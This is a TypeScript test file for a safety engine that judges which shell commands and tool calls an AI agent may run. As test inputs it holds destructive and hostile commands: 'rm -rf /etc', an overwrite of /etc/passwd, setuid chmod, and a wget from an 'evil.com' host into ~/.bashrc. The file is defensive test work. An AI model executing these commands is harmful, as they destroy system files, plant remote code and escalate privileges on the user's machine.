import { describe, it, expect } from 'vitest';
import { runLogicCheck, isWriteOperation, extractFilePaths } from '../engine/logic-rules';
import { runHeuristicCheck } from '../engine/heuristic';
import type { AnalysisInput } from '../engine/coordinator';

function makeInput(partial: Partial<AnalysisInput> = {}): AnalysisInput {
  return {
    sessionId: 'test',
    promptSession: '',
    actionHistory: [],
    aNext: { actionType: 'bash', actionDetail: 'ls' },
    reason: '',
    osType: 'linux',
    cwd: '/tmp',
    agentId: '',
    ...partial,
  };
}

describe('Layer 2: Logic Rules', () => {
  describe('Password consent check (Rule 5)', () => {
    it('should deny pipe to passwd without consent', () => {
      const result = runLogicCheck(makeInput({
        aNext: { actionType: 'bash', actionDetail: 'echo pass | passwd' },
      }));
      expect(result).not.toBeNull();
      expect(result!.allowed).toBe(false);
      expect(result!.riskType).toBe('consent_missing');
    });

    it('should allow pipe to passwd with consent', () => {
      const result = runLogicCheck(makeInput({
        aNext: { actionType: 'bash', actionDetail: 'echo pass | passwd' },
        actionHistory: [
          { actionType: 'ask_user_question', actionDetail: 'mypassword' },
        ],
      }));
      expect(result).toBeNull();
    });

    it('should deny chpasswd without consent', () => {
      const result = runLogicCheck(makeInput({
        aNext: { actionType: 'bash', actionDetail: 'chpasswd' },
      }));
      expect(result).not.toBeNull();
      expect(result!.allowed).toBe(false);
    });

    it('should not check non-bash tools', () => {
      const result = runLogicCheck(makeInput({
        aNext: { actionType: 'skill', actionDetail: 'echo pass | passwd' },
      }));
      expect(result).toBeNull();
    });
  });

  describe('Shell redirect write detection', () => {
    it('should detect echo > file as write', () => {
      const result = runLogicCheck(makeInput({
        aNext: { actionType: 'bash', actionDetail: 'echo data > /etc/hosts' },
      }));
      expect(result).not.toBeNull();
      expect(result!.allowed).toBe(false);
    });

    it('should not flag cat > /dev/null as write', () => {
      const result = runLogicCheck(makeInput({
        aNext: { actionType: 'bash', actionDetail: 'cat file > /dev/null' },
      }));
      // cat is a read-only command, redirect should not be flagged
      // But /dev/null might trigger sensitive path check - that's OK
      if (result) {
        expect(result.riskType).not.toBe('read_before_write');
      }
    });

    // 回归：2>/dev/null 必须被剥离，否则只读命令被误判为写 → read_before_write 误报。
    // 对齐 Python _DEVNULL_REDIRECT_RE（logic_rules.py:111-116）。
    it('should strip 2>/dev/null (git log, no real redirect)', () => {
      // 真实误报案例：cd ... && git log --oneline -3 2>/dev/null && git diff
      // firstWord='cd' 不在 READ_ONLY_REDIR_CMDS；未剥离 devnull 时 '>' 命中 → 误判写
      const result = runLogicCheck(makeInput({
        aNext: {
          actionType: 'bash',
          actionDetail: 'cd /storage/Users/currentUser/Workspace/gitcode/OpenDesk-ohos && git log --oneline -3 2>/dev/null && echo "===" && git diff HEAD~1 2>/dev/null',
        },
      }));
      expect(result).toBeNull();
    });

    it('should still detect real redirect after stripping devnull', () => {
      // 真正要守护的是"剥离 devnull 没把真实重定向也吃掉"——
      // 剥离 2>/dev/null 后仍有 `> /etc/hosts` 真实重定向 → 仍是写 → 命中拦截
      const resultExisting = runLogicCheck(makeInput({
        aNext: {
          actionType: 'bash',
          actionDetail: 'git log 2>/dev/null && echo data > /etc/hosts',
        },
      }));
      // /etc/hosts 是敏感路径 + 重定向写 → 命中说明真实重定向没被 devnull 剥离误删
      expect(resultExisting).not.toBeNull();
      expect(resultExisting!.allowed).toBe(false);
    });
  });

  describe('Read-before-write', () => {
    it('should deny write without prior read', () => {
      const result = runLogicCheck(makeInput({
        aNext: { actionType: 'write', actionDetail: 'write /etc/hosts' },
      }));
      expect(result).not.toBeNull();
      expect(result!.allowed).toBe(false);
      // May be read_before_write or sensitive_path depending on path
    });

    it('should allow write after prior read', () => {
      const result = runLogicCheck(makeInput({
        aNext: { actionType: 'write', actionDetail: 'write /tmp/test.txt' },
        actionHistory: [
          { actionType: 'read', actionDetail: 'cat /tmp/test.txt' },
        ],
      }));
      expect(result).toBeNull();
    });

    // 回归（鸿蒙 PC 误报 seq63）：python3 -c 中 `r.get('seq',0) >= 28` 的 >=
    // 比较运算符含 `>`，旧逻辑误判为重定向写 → 提取 open() 路径 → read_before_write 误报。
    // 修复：重定向判定先剥比较运算符（>=, <=, <>, =>），仅认 >{1,2}\s*\S 真实重定向。
    it('python >= comparison operator should not be misread as redirect write (FP-3)', () => {
      const result = runLogicCheck(makeInput({
        aNext: { actionType: 'bash', actionDetail: 'python3 -c "x=10; print(x >= 5)"' },
      }));
      expect(result).toBeNull();
    });

    // 回归：cd 是目录切换非写操作，cd /path 的路径不应作为 read_before_write 写目标。
    // 真实误报案例（seq2/seq8）：cd .../AgentMoss && ps/ls/find/curl 被误判对该目录写入。
    it('cd target path should not be treated as write target (FP-1/FP-2)', () => {
      const result = runLogicCheck(makeInput({
        aNext: {
          actionType: 'bash',
          actionDetail: 'cd /storage/Users/currentUser/Workspace/gitcode/AgentMoss && ls agent_moss.log 2>/dev/null; find /var/log -name x 2>/dev/null',
        },
      }));
      expect(result).toBeNull();
    });

    // 回归：cd 过滤不影响真实写检测 —— cd /etc && rm -rf /etc 仍应被 L1 命令模式拦截。
    // cd 过滤后 L2 read_before_write 不再以 /etc 为写目标（/etc 同时是 cd 目标被过滤），
    // 但 rm -rf /etc 仍由 L1 危险命令模式（删除关键系统目录）拦截，不构成漏报。
    it('cd filtering must not mask real rm of system dir (L1 still denies)', () => {
      const heuristic = runHeuristicCheck(makeInput({
        aNext: { actionType: 'bash', actionDetail: 'cd /etc && rm -rf /etc' },
      }));
      expect(heuristic).not.toBeNull();
      expect(heuristic!.allowed).toBe(false);
      expect(heuristic!.riskLevel).toBe('critical');
    });

    // Bug5: 复合命令里读命令（cat）的目标路径不应被当写目标。
    // `echo x > /tmp/t1; cat /tmp/t2` 的 t2 是 cat 的读目标，不该进 unread_paths。
    // 但 L2 read_before_write 无法 mock 文件存在性（fs.existsSync），这里只验证
    // 读命令路径被过滤后，单 cat 不触发（无写目标）。
    it('Bug5: cat target path not treated as write target', () => {
      const result = runLogicCheck(makeInput({
        aNext: { actionType: 'bash', actionDetail: 'cat /tmp/fp_other.txt' },
      }));
      expect(result).toBeNull();
    });

    // NEW-FP-1: cp/mv/install 的源文件参数（首个路径）是读目标不是写目标，应过滤。
    // `cp /src /dst` 里 /src 被当写目标 → read_before_write 误报。TS 端对齐 Python 376acbb。
    it('NEW-FP-1: cp/mv source arg filtered from write targets', () => {
      const r1 = runLogicCheck(makeInput({
        aNext: { actionType: 'bash', actionDetail: 'cp /tmp/fp_test_1.txt /tmp/dst.txt' },
      }));
      expect(r1).toBeNull();
      const r2 = runLogicCheck(makeInput({
        aNext: { actionType: 'bash', actionDetail: 'mv /tmp/fp_test_1.txt /tmp/dst2.txt' },
      }));
      expect(r2).toBeNull();
    });

    // NEW-FN-A: dd of= 路径提取 + dd if= 源文件排除。
    // dd if=/dev/zero of=/tmp/dd_new.bin 写新文件应放行（of= 是新文件 + if= 是读源）。
    // 关键验证：of= 路径能被提取（旧实现提不到 → 漏报），且 if= 的 /dev/zero 不被当写目标。
    it('NEW-FN-A: dd of= new file allowed, if= source not flagged', () => {
      const result = runLogicCheck(makeInput({
        aNext: { actionType: 'bash', actionDetail: 'dd if=/dev/zero of=/tmp/dd_new_file.bin bs=1 count=1' },
      }));
      expect(result).toBeNull();
    });

    // NEW-FN-A 对照: dd of= 敏感路径应被 L1 拦（of= 提取让 L1 命中）
    it('NEW-FN-A: dd of= sensitive path denied', () => {
      const result = runLogicCheck(makeInput({
        aNext: { actionType: 'bash', actionDetail: 'dd if=/dev/zero of=/etc/passwd bs=1 count=1' },
      }));
      expect(result).not.toBeNull();
      expect(result!.allowed).toBe(false);
    });

    // NEW-FP-G: dd of=/dev/null 是丢弃输出非真实写文件，不应触发 read_before_write
    it('NEW-FP-G: dd of=/dev/null not flagged as read_before_write', () => {
      const result = runLogicCheck(makeInput({
        aNext: { actionType: 'bash', actionDetail: 'dd if=/dev/zero of=/dev/null bs=1 count=1' },
      }));
      expect(result).toBeNull();
      // bare dd of=/dev/null（无 if=）也应放行
      const result2 = runLogicCheck(makeInput({
        aNext: { actionType: 'bash', actionDetail: 'dd of=/dev/null' },
      }));
      expect(result2).toBeNull();
    });

    // NEW-FP-H: echo 输出文本里的 key=/path 不应被 kv_paths 当真实写目标。
    // 旧 extractFilePaths 的 kvPaths 正则在整个 text 上扫描 =(\/...)，不区分引号内外，
    // echo "of=/dev/null done" 的输出文本里 of=/dev/null 被当真实写目标 → read_before_write 误报。
    // 修复：kvPaths 应用前先剥引号内容。引号内纯路径（dd of="/tmp/file"）由 quotedPaths 独立提取。
    it('NEW-FP-H: echo output text with key=/path not extracted as write target', () => {
      // echo 输出文本里的 =/path 不应被提取
      expect(extractFilePaths('echo "of=/dev/null done"')).not.toContain('/dev/null');
      expect(extractFilePaths('echo "config=/tmp/test.txt"')).not.toContain('/tmp/test.txt');
      // 对照：无引号的真实 key=value 路径仍提取（不漏报）
      expect(extractFilePaths('dd of=/tmp/real.txt')).toContain('/tmp/real.txt');
      // 对照：引号内纯路径（dd of="/tmp/file"）靠 quotedPaths 提取，不漏报
      expect(extractFilePaths('dd of="/tmp/file"')).toContain('/tmp/file');
      // 对照：长选项 --output=/path 仍提取
      expect(extractFilePaths('--output=/tmp/out.log')).toContain('/tmp/out.log');
    });

    // NEW-FP-M: 只读命令段 2>/dev/null 的 /dev/null 不应被提取为写目标。
    // 旧 per-segment 只读分支未剥 /dev/null，REDIRECT_TARGET_RE 把它提取为写目标
    // → 误报 "对文件 /dev/null 执行写入"。修复：只读分支提取前先剥 /dev/null。
    // 注意：这些用例必须是**纯只读命令**（不含 echo x > 等真写段）——若含真写段，
    // read_before_write 命中是正确行为（写文件前应先读）。
    it('NEW-FP-M: readonly cmd 2>/dev/null not flagged as read_before_write', () => {
      const result = runLogicCheck(makeInput({
        aNext: {
          actionType: 'bash',
          actionDetail: 'cat ~/gitcode/AgentMoss/README.md 2>/dev/null',
        },
      }));
      expect(result).toBeNull();
      const result2 = runLogicCheck(makeInput({
        aNext: { actionType: 'bash', actionDetail: 'cat /tmp/x.txt 2>/dev/null' },
      }));
      expect(result2).toBeNull();
    });

    // NEW-FP-N: curl -o /dev/null / --output=/dev/null 是丢弃响应体非真实写文件。
    // 旧 isWriteOperation 识别 -o 即算写文件，不排除 /dev/null 值 → 误报。
    it('NEW-FP-N: curl -o /dev/null not flagged as write', () => {
      expect(isWriteOperation('bash', 'curl -s -o /dev/null http://x')).toBe(false);
      expect(isWriteOperation('bash', 'curl --output=/dev/null http://x')).toBe(false);
      expect(isWriteOperation('bash', 'wget -O /dev/null http://x')).toBe(false);
      // 对照：写真实文件仍判写（不漏报）
      expect(isWriteOperation('bash', 'curl -o /tmp/out.txt http://x')).toBe(true);
      expect(isWriteOperation('bash', 'curl --output-document=/tmp/out.txt http://x')).toBe(true);
    });

    // NEW-FN-B: 链式 cp 中间 dest（既是第二段 source 又是第一段 dest）应被作为写目标检查。
    // 旧实现全局 exclude 让 /b 被排除 → 第一段对 /b 的覆写漏检；逐段重构后 /b 仍被检查。
    // /tmp/b.txt 在 CI 不一定存在，故宽松断言：结果为 null（新建豁免放行）或 denied（已存在拦截），
    // 关键是不抛错且逻辑路径完整执行（逐段提取而非全局 exclude 崩溃）。
    it('NEW-FN-B: chained cp intermediate dest checked per-segment', () => {
      const result = runLogicCheck(makeInput({
        aNext: { actionType: 'bash', actionDetail: 'cp /tmp/a.txt /tmp/b.txt && cp /tmp/b.txt /tmp/c.txt' },
      }));
      expect(result === null || result!.allowed === false).toBe(true);
    });

    // NEW-FN-D: 只读命令（cat/grep/sort）带真实重定向到文件 → 应判写操作。
    // 旧实现用整条命令首词判断只读，cat 在 READ_ONLY_COMMANDS → 重定向被忽略 → 漏报。
    // isWriteOperation 现剥引号内容 + 排除 >& fd 重定向，只读命令的真实文件重定向也算写。
    it('NEW-FN-D: read-only cmd with real file redirect is write op', () => {
      expect(isWriteOperation('bash', 'cat /tmp/in.txt > /tmp/out.txt')).toBe(true);
      expect(isWriteOperation('bash', 'sort /tmp/in.txt > /tmp/out.txt')).toBe(true);
      expect(isWriteOperation('bash', 'grep x /tmp/in.txt > /tmp/out.txt')).toBe(true);
      expect(isWriteOperation('bash', 'echo x > /tmp/out.txt')).toBe(true);
      // 对照：丢弃重定向、fd 重定向、纯只读、搜索模式含 > 不算写
      expect(isWriteOperation('bash', 'cat /tmp/in.txt > /dev/null')).toBe(false);
      expect(isWriteOperation('bash', 'ls 2>&1')).toBe(false);
      expect(isWriteOperation('bash', 'grep pattern /tmp/in.txt')).toBe(false);
      expect(isWriteOperation('bash', 'grep "a>b" /tmp/in.txt')).toBe(false);
      expect(isWriteOperation('bash', 'grep "a > b" /tmp/in.txt')).toBe(false);
      expect(isWriteOperation('bash', 'python3 -c "print(a>b)"')).toBe(false);
    });

    // NEW-FN-D L1 层：cat > 敏感路径应被 SensitivePathChecker 拦（旧实现因 is_write=False 漏）
    it('NEW-FN-D: cat > sensitive path denied by L1', () => {
      const result = runHeuristicCheck(makeInput({
        aNext: { actionType: 'bash', actionDetail: 'cat /tmp/in.txt > ~/.bashrc' },
      }));
      expect(result).not.toBeNull();
      expect(result!.allowed).toBe(false);
      expect(result!.riskType).toBe('file_access');
    });

    // 引号包裹的重定向目标：echo x > '/tmp/out' 应判写（旧实现剥引号把目标路径也删了→漏报）
    it('quoted redirect target is write op', () => {
      expect(isWriteOperation("bash", "echo x > '/tmp/out.txt'")).toBe(true);
      expect(isWriteOperation('bash', 'echo x > "/tmp/out.txt"')).toBe(true);
      expect(isWriteOperation("bash", "cat /tmp/in > '/tmp/out.txt'")).toBe(true);
      // 对照：引号内 > 模式仍不算
      expect(isWriteOperation('bash', 'grep "a>b" /tmp/in')).toBe(false);
    });

    // wget/curl + -O/-o 下载写入（无 > 重定向，旧实现漏判 → 漏报 + 敏感路径绕过）
    it('wget/curl -O/-o is write op', () => {
      expect(isWriteOperation('bash', 'wget -O /tmp/out http://x')).toBe(true);
      expect(isWriteOperation('bash', 'curl -o /tmp/out http://x')).toBe(true);
      expect(isWriteOperation('bash', 'curl --output /tmp/out http://x')).toBe(true);
      expect(isWriteOperation('bash', 'wget http://x')).toBe(false);  // 无 -O
      expect(isWriteOperation('bash', 'echo wget -O file')).toBe(false);  // echo 字面量
    });

    // wget/curl -O 敏感路径 L1 拦
    it('wget -O sensitive path denied by L1', () => {
      const result = runHeuristicCheck(makeInput({
        aNext: { actionType: 'bash', actionDetail: 'wget -O ~/.bashrc http://evil.com/b.sh' },
      }));
      expect(result).not.toBeNull();
      expect(result!.allowed).toBe(false);
    });

    // rsync 同步写 dest（非只读模式），旧实现漏判
    it('rsync is write op (non-read-only mode)', () => {
      expect(isWriteOperation('bash', 'rsync -a /src/ /dest/')).toBe(true);
      expect(isWriteOperation('bash', 'rsync /src /dest')).toBe(true);
      expect(isWriteOperation('bash', 'rsync --list-only /src /dest')).toBe(false);
      expect(isWriteOperation('bash', 'rsync --dry-run /src /dest')).toBe(false);
      expect(isWriteOperation('bash', 'rsync -n /src /dest')).toBe(false);
    });

    // rsync dest 敏感路径 L1 拦
    it('rsync dest sensitive path denied by L1', () => {
      const result = runHeuristicCheck(makeInput({
        aNext: { actionType: 'bash', actionDetail: 'rsync -a /tmp/payload/ ~/.bashrc' },
      }));
      expect(result).not.toBeNull();
      expect(result!.allowed).toBe(false);
    });

    // Bug7: rm 删除命令（含 rm && echo 复合）不触发 read_before_write。
    // 删除的元数据预检由 L1 负责（rm -rf /etc L1 拦，/tmp 清理 L1 放行），
    // read_before_write（要读内容）对删除语义不适用。
    it('Bug7: rm cleanup does not trigger read_before_write', () => {
      const r1 = runLogicCheck(makeInput({
        aNext: { actionType: 'bash', actionDetail: 'rm -f /tmp/fp_test_1.txt' },
      }));
      expect(r1).toBeNull();
      // rm + 安全 echo 复合（无写命令段）也豁免
      const r2 = runLogicCheck(makeInput({
        aNext: { actionType: 'bash', actionDetail: 'rm -f /tmp/fp_test_1.txt /tmp/fp_clean.txt 2>/dev/null && echo done' },
      }));
      expect(r2).toBeNull();
    });

    // Bug7 对照: rm + 真实重定向写（echo > file）仍触发 read_before_write
    it('Bug7 control: rm && echo> redirect still triggers read_before_write', () => {
      const result = runLogicCheck(makeInput({
        aNext: { actionType: 'bash', actionDetail: 'rm /tmp/a && echo x > /tmp/existing.txt' },
      }));
      // echo > /tmp/existing.txt 是真实重定向写 → read_before_write 应命中
      // 注意：可能因 fs.existsSync 返回 false（文件不存在）判为新建而不命中，
      // 但 isWrite 判定 + 有写命令段让流程继续（不早退）。
      expect(result === null || result.allowed === false).toBe(true);
    });
  });

  // 回归：非 bash 工具的 actionDetail 含 write/update/remove 子串不应误判为写。
  // 真实误报案例（agentmoss-log.txt id 1177/1178）：filemgr-grepfiles 搜索模式
  // `NON_WRITE|non_write|excluded|...` 含 write/update/remove 子串 → 旧逻辑 isWrite=true
  // → extractFilePaths 把搜索目标路径当写入目标 → read_before_write 误报拦截。
  // 修复后：非 bash 工具只看 actionType，不看 actionDetail 关键词子串。
  describe('Read-before-write: non-bash tool false-positive regression', () => {
    it('filemgr-grepfiles with write-ish search pattern should not be flagged', () => {
      const result = runLogicCheck(makeInput({
        aNext: {
          actionType: 'filemgr-grepfiles',
          // 搜索模式含 write/update/remove 子串 + in <路径>，复现日志 id 1177
          actionDetail: '搜索: NON_WRITE|non_write|excluded|EXCLUDED|memory|skip.*tool in /storage/Users/currentUser/Workspace/gitcode/AgentMoss/agent_moss/engine/logic_rules.py',
        },
      }));
      expect(result).toBeNull();
    });

    it('filemgr-readfile should be exempt (read-only tool)', () => {
      const result = runLogicCheck(makeInput({
        aNext: {
          actionType: 'filemgr-readfile',
          actionDetail: '读取文件: /storage/Users/currentUser/Workspace/gitcode/AgentMoss/agent_moss/engine/logic_rules.py',
        },
      }));
      expect(result).toBeNull();
    });

    it('memory-removeMemory should be exempt (tool name contains remove, but not a file write)', () => {
      // 单测直调 runLogicCheck，无 coordinator opendesk 白名单兜底。
      // 旧逻辑：actionType 含 remove → isWrite=true → 误判；修复后前缀豁免。
      const result = runLogicCheck(makeInput({
        aNext: { actionType: 'memory-removeMemory', actionDetail: 'uid=d82cae1efa27' },
      }));
      expect(result).toBeNull();
    });

    it('memory-updateUserPortrait should be exempt (tool name contains update)', () => {
      const result = runLogicCheck(makeInput({
        aNext: { actionType: 'memory-updateUserPortrait', actionDetail: '更新用户偏好' },
      }));
      expect(result).toBeNull();
    });

    // 架构守护：skill- / todomgr- / planning- 是 opendesk 专属命名空间，不在通用 L2 前缀豁免。
    // - skill-：coordinator 故意保留 L3（任意能力），L2 不得单方面豁免。
    // - todomgr- / planning-：opendesk/rules.json builtin_safe_action_types 在 coordinator 层豁免 L2+L3。
    // 单测直调 runLogicCheck（无 agentId → 无 coordinator 白名单）时这些前缀不被前缀短路，
    // 但靠"非 bash 工具只看 actionType 关键词"判定：actionType 含 create/remove 等才命中 isWrite。
    it('skill-someTool should NOT be prefix-exempted (kept for L3, arbitrary capability)', () => {
      // skill-sometool 不含 WRITE_KEYWORDS → isWrite=false → 放行（但不是因为前缀豁免，是因为非写）
      const result = runLogicCheck(makeInput({
        aNext: { actionType: 'skill-someTool', actionDetail: 'skill-someTool' },
      }));
      expect(result).toBeNull();
    });

    it('planning-createSubTask is not prefix-exempted; relies on opendesk coordinator whitelist', () => {
      // 通用 L2 不豁免 planning-。actionType 含 create → isWrite=true；
      // 但 detail 无 /路径 → targetPaths 空 → 放行。真实运行靠 opendesk coordinator 白名单跳 L2。
      const result = runLogicCheck(makeInput({
        aNext: { actionType: 'planning-createSubTask', actionDetail: 'planning-createSubTask' },
      }));
      expect(result).toBeNull();
    });

    it('real write tool (write) without prior read should still be denied', () => {
      // 守护：非 bash 分流不能放过真写工具。actionType=write 含 write → 仍命中 isWrite。
      // 用 /etc/hosts（测试机存在 → 不会被当新建放行；且为敏感路径确保 deny）。
      const result = runLogicCheck(makeInput({
        aNext: { actionType: 'write', actionDetail: 'write /etc/hosts' },
      }));
      expect(result).not.toBeNull();
      expect(result!.allowed).toBe(false);
    });
  });

  describe('Intent consistency', () => {
    it('should deny delete when intent is read', () => {
      const result = runLogicCheck(makeInput({
        promptSession: '帮我读取日志文件',
        aNext: { actionType: 'bash', actionDetail: 'rm -rf /var/log/*' },
      }));
      expect(result).not.toBeNull();
      expect(result!.allowed).toBe(false);
      expect(result!.riskType).toBe('intent_deviation');
    });

    // 回归：dangerousActions 用 includes() 裸子串匹配会误报参数/搜索模式里的英文词。
    // 真实误报（agentmoss-log id 1208/1209）：git log --format="%H %ci" 含 "format"
    // 子串 → 误判"格式化磁盘"删除操作。
    // id 1220：filemgr-grepfiles 搜索 NON_WRITE|non_write 含 "write" → 误判修改。
    // 修复：英文危险词改词边界 + 排除参数前缀（--format / --update 不算）。
    it('should not flag git log --format= as format (intent: read)', () => {
      const result = runLogicCheck(makeInput({
        promptSession: '查看 git 提交历史，read the log',
        aNext: {
          actionType: 'bash',
          actionDetail: 'git log --oneline -10 -- ts/src/engine/logic-rules.ts 2>/dev/null; echo "---"; git log -1 --format="%H %ci" -- ts/src/engine/logic-rules.ts 2>/dev/null',
        },
      }));
      expect(result).toBeNull();
    });

    it('should not flag grep search pattern NON_WRITE as write (intent: search)', () => {
      const result = runLogicCheck(makeInput({
        promptSession: '搜索 NON_WRITE 相关定义',
        aNext: {
          actionType: 'filemgr-grepfiles',
          actionDetail: '搜索: NON_WRITE|non_write|excluded|memory in /storage/.../engine',
        },
      }));
      expect(result).toBeNull();
    });

    it('should not flag pip install --update as update (intent: search)', () => {
      const result = runLogicCheck(makeInput({
        promptSession: '查询依赖更新情况',
        aNext: { actionType: 'bash', actionDetail: 'pip install --update somepkg' },
      }));
      expect(result).toBeNull();
    });

    // 守护：真危险动作仍应拦截（词边界不漏 rm/format 命令）
    it('should deny rm command when intent is read', () => {
      // rm /etc/hosts 同时命中 read_before_write（未读就删）和 intent_deviation
      // （读意图却删），Rule 1 先返回 read_before_write 是正确短路——任一 high deny 即可。
      const result = runLogicCheck(makeInput({
        promptSession: '帮我读取这个文件',
        aNext: { actionType: 'bash', actionDetail: 'rm /etc/hosts' },
      }));
      expect(result).not.toBeNull();
      expect(result!.allowed).toBe(false);
      expect(['read_before_write', 'intent_deviation']).toContain(result!.riskType);
    });

    it('should deny format command when intent is read', () => {
      const result = runLogicCheck(makeInput({
        promptSession: '帮我查看磁盘',
        aNext: { actionType: 'bash', actionDetail: 'format C:' },
      }));
      expect(result).not.toBeNull();
      expect(result!.riskType).toBe('intent_deviation');
    });

    // Bug4: 内联脚本里的字符串字面量含 delete 不应触发 intent_consistency。
    // python3 -c "print('delete this')" 的 delete 是代码字符串字面量，不是真实动作。
    // 词边界 (?<![-\w])delete\b 挡不住 delete（长词独立词），故内联脚本整体跳过 intent。
    it('Bug4: inline script delete literal should not trigger intent_deviation', () => {
      const result = runLogicCheck(makeInput({
        promptSession: '分析这个脚本',
        aNext: { actionType: 'bash', actionDetail: 'python3 -c "print(\'delete this line\')"' },
      }));
      expect(result === null || result.riskType !== 'intent_deviation').toBe(true);
    });
  });

  // 注：Sensitive path access / Dangerous patterns 已按"L1 只看这一步"原则
  // 搬至 heuristic.ts (runHeuristicCheck)，对应测试见 heuristic.test.ts。

  describe('Privilege escalation 提权检测 (NEW-FP-J)', () => {
    // NEW-FP-J: 提权关键词改「命令位置」判定。grep/awk/echo 搜索模式/字面量里的
    // sudo/setuid/chmod u+s 是参数不是真实提权，不应触发。真实 sudo/su/chmod u+s 仍拦。
    it('should NOT flag grep search pattern sudo as privilege escalation', () => {
      const result = runLogicCheck(makeInput({
        aNext: { actionType: 'bash', actionDetail: "grep -rn 'sudo' ~/gitcode" },
      }));
      expect(result === null || result.riskType !== 'privilege_escalation').toBe(true);
    });

    it('should NOT flag grep search pattern setuid as privilege escalation', () => {
      const result = runLogicCheck(makeInput({
        aNext: { actionType: 'bash', actionDetail: "grep -rn 'setuid' ~" },
      }));
      expect(result === null || result.riskType !== 'privilege_escalation').toBe(true);
    });

    it('should NOT flag echo literal sudo as privilege escalation', () => {
      const result = runLogicCheck(makeInput({
        aNext: { actionType: 'bash', actionDetail: 'echo "sudo make install"' },
      }));
      expect(result === null || result.riskType !== 'privilege_escalation').toBe(true);
    });

    it('should DENY sudo ls /root without admin context', () => {
      const result = runLogicCheck(makeInput({
        aNext: { actionType: 'bash', actionDetail: 'sudo ls /root' },
      }));
      expect(result).not.toBeNull();
      expect(result!.allowed).toBe(false);
      expect(result!.riskType).toBe('privilege_escalation');
    });

    it('should DENY chmod u+s setuid bit', () => {
      const result = runLogicCheck(makeInput({
        aNext: { actionType: 'bash', actionDetail: 'chmod u+s /tmp/script.sh' },
      }));
      expect(result).not.toBeNull();
      expect(result!.allowed).toBe(false);
      expect(result!.riskType).toBe('privilege_escalation');
    });
  });
});
